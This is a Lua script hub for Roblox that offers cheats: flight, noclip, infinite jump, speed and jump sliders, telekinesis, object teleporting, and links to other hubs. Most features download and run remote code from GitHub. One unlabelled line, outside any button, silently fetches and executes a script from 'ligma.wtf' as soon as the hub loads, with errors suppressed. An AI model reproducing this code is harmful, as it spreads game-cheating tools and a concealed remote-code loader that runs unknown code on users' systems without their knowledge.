local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()

local win = Flux:Window("PλNDA", "Script Hub", Color3.fromRGB(133, 133, 133), Enum.KeyCode.LeftControl)
local tab = win:Tab("General Scripts", "http://www.roblox.com/asset/?id=6023426915")

tab:Label("General Movement")

tab:Button("Flight", "Fly like a butterfly sting like a bee. Toggle flight with 'E'. May require re-activating after a respawn.", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TR011F4C3/PANDA/main/scripts/fly.lua", true))()
end)

tab:Button("Ghost", "Form of noclip that allows you to stand in mid-air. Not compatible with fly. Toggle ghost with 'V'.", function()
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)

if key == "v" then
noclip = not noclip
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
end)

tab:Button("Infinite Jump", "Keep on jumpin'. Toggle with 'F'.", function()
    
_G.infinjump = true
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
if _G.infinjump then
if k:byte() == 32 then
Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Humanoid:ChangeState("Jumping")
wait(0.1)
Humanoid:ChangeState("Seated")
end
end
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
k = k:lower()
if k == "f" then
if _G.infinjump == true then
_G.infinjump = false
else
_G.infinjump = true
end
end
end)
end)
pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
tab:Label("Movement Sliders")


tab:Slider("Walkspeed", "Gotta go fast!", 0, 500,16,function(walkspeedslider)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (walkspeedslider)
end)

tab:Slider("Jump Height", "Gotta get high! Wait a second...", 0, 500,50,function(jumpheightslider)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = (jumpheightslider)
end)

tab:Label("Miscellaneous Scripts")

tab:Button("Telekinesis", "Instructions: https://sitelist.neocities.org/scripts/tel.html", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TR011F4C3/PANDA/main/scripts/tel.lua", true))()
end)

tab:Button("Unanchored Object Teleporter", "Simple GUI that allows for the teleportation of unanchored objects. Made by TomQ#6764", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TR011F4C3/PANDA/main/scripts/unanchored_teleporter.lua", true))()
end)

tab:Label("More Miscellaneous Scripts are coming so stay tuned!")

local tab = win:Tab("Other Script Hubs", "http://www.roblox.com/asset/?id=6023426915")

tab:Label("FE Script Hubs")

tab:Button("Infinite Yield", "One of the best Script Hubs out there. Has the ability to import plugins.", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

tab:Button("Dark Hub", "Awesome script hub with 40+ games!", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
end)

tab:Button("Sniff Hub", "Relatively small script hub with sleek UI.", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/Sniff-Hub/main/Sniff%20hub%20v2", true))()
end)

local tab = win:Tab("Credits", "http://www.roblox.com/asset/?id=6023426915")
tab:Label("The Clown#0001 - Main Creator")
tab:Label("pog#5555 - Alpha/Beta Tester")
tab:Label("epik#0905 - Alpha/Beta Tester")
tab:Label("Pandq#2169 - Error 404/Sleeping through Script Development")
